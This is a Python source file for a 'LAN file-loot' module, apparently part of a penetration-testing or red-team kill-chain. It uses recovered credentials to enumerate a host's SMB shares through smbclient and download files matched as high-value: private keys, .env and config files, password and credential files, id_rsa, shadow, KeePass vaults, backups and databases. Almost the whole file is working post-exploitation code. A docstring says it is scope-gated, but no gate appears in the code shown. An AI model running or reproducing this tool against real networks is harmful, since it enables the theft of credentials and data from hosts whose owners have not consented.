"""LAN file-loot — pull interesting files off a host with recovered creds.

The kill-chain used to stop at "here are the hosts and the credentials." This is
the payoff: with a recovered credential, enumerate a host's SMB shares, pick the
files worth grabbing (configs, keys, env files, backups, docs, databases), and
pull them down — straight into the forensic triage (#2) that was already built and
waiting for files. Scope-gated like the rest of the pivot; the Operator's LOOT
phase calls it only on in-scope hosts.

Pure/testable: `smbclient` runs through an injected runner, so share/file parsing
and the interesting-file heuristic are verified with no network and no Samba.
"""
from __future__ import annotations

import re
import subprocess
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, List, Optional, Sequence, Tuple

# file extensions worth pulling — secrets, configs, creds, data. The point is to
# grab the high-signal stuff, not mirror the whole share.
_INTERESTING_EXT = {
    ".env", ".conf", ".config", ".ini", ".cfg", ".yml", ".yaml",
    ".key", ".pem", ".ppk", ".pfx", ".kdbx", ".ovpn",
    ".bak", ".old", ".backup", ".sql", ".db", ".sqlite",
    ".txt", ".csv", ".xls", ".xlsx", ".doc", ".docx", ".pdf",
}
# name fragments that flag a file regardless of extension
_INTERESTING_NAME = ("passw", "secret", "cred", "token", "id_rsa", "shadow",
                     "config", "backup", "vault", ".git")
# shares that are never loot (admin/print plumbing)
_SKIP_SHARES = {"ipc$", "print$", "admin$", "c$"}
_SAFE = re.compile(r"[^A-Za-z0-9_.\-]")       # sanitize a name before it hits disk


def interesting(name: str) -> bool:
    """Is this filename worth pulling?"""
    low = (name or "").lower()
    if any(frag in low for frag in _INTERESTING_NAME):
        return True
    return any(low.endswith(ext) for ext in _INTERESTING_EXT)


def parse_shares(text: str) -> List[str]:
    """Share names from `smbclient -L` output, minus the admin/print plumbing."""
    out: List[str] = []
    for line in (text or "").splitlines():
        m = re.match(r"\s+(\S+)\s+Disk", line)
        if m:
            name = m.group(1)
            if name.lower() not in _SKIP_SHARES:
                out.append(name)
    return out


def parse_listing(text: str) -> List[str]:
    """Regular-file names from an `smbclient -c ls` listing (skip dirs and . ..)."""
    out: List[str] = []
    for line in (text or "").splitlines():
        # "  name    A   size  Day Mon dd hh:mm:ss yyyy"  (A=archive/file, D=dir)
        m = re.match(r"\s+(.+?)\s+([DAHSR]+)\s+\d+\s+\w", line)
        if not m:
            continue
        name, attrs = m.group(1).strip(), m.group(2)
        if "D" in attrs or name in (".", ".."):
            continue
        out.append(name)
    return out


@dataclass
class SmbLooter:
    """Enumerate + pull files from a host's SMB shares with a recovered credential.
    `runner` is injected for tests; real on the device (needs smbclient)."""
    runner: Callable = None
    timeout: int = 30
    max_files: int = 25

    def _run(self, argv):
        run = self.runner or subprocess.run
        try:
            return run(argv, capture_output=True, text=True, timeout=self.timeout, check=False)
        except (OSError, subprocess.SubprocessError) as error:
            return subprocess.CompletedProcess(argv, 1, "", f"{type(error).__name__}")

    def _auth(self, user: str, password: str) -> str:
        return f"{user}%{password}"

    def shares(self, host: str, user: str, password: str) -> List[str]:
        r = self._run(["smbclient", "-L", f"//{host}", "-U", self._auth(user, password), "-g"])
        # -g gives "Disk|share|comment"; fall back to the human table parser
        g = [ln.split("|")[1] for ln in (r.stdout or "").splitlines()
             if ln.startswith("Disk|") and len(ln.split("|")) > 1
             and ln.split("|")[1].lower() not in _SKIP_SHARES]
        return g or parse_shares(r.stdout or "")

    def files(self, host: str, share: str, user: str, password: str) -> List[str]:
        r = self._run(["smbclient", f"//{host}/{share}", "-U", self._auth(user, password),
                       "-c", "ls"])
        return parse_listing(r.stdout or "")

    def pull(self, host: str, share: str, user: str, password: str, name: str, dest: Path) -> Optional[str]:
        safe = _SAFE.sub("_", name)
        local = Path(dest) / f"{_SAFE.sub('_', host)}_{_SAFE.sub('_', share)}_{safe}"
        r = self._run(["smbclient", f"//{host}/{share}", "-U", self._auth(user, password),
                       "-c", f'get "{name}" "{local}"'])
        return str(local) if getattr(r, "returncode", 1) == 0 else None

    def loot_host(self, host: str, user: str, password: str, *, dest) -> Tuple[List[str], List[str]]:
        """Enumerate shares, pull the interesting files, return (pulled_paths, notes)."""
        dest = Path(dest)
        dest.mkdir(parents=True, exist_ok=True)
        pulled: List[str] = []
        notes: List[str] = []
        for share in self.shares(host, user, password):
            picks = [f for f in self.files(host, share, user, password) if interesting(f)]
            notes.append(f"{host}/{share}: {len(picks)} interesting file(s)")
            for name in picks:
                if len(pulled) >= self.max_files:
                    notes.append(f"stopped at max_files={self.max_files}")
                    return pulled, notes
                path = self.pull(host, share, user, password, name, dest)
                if path:
                    pulled.append(path)
        return pulled, notes
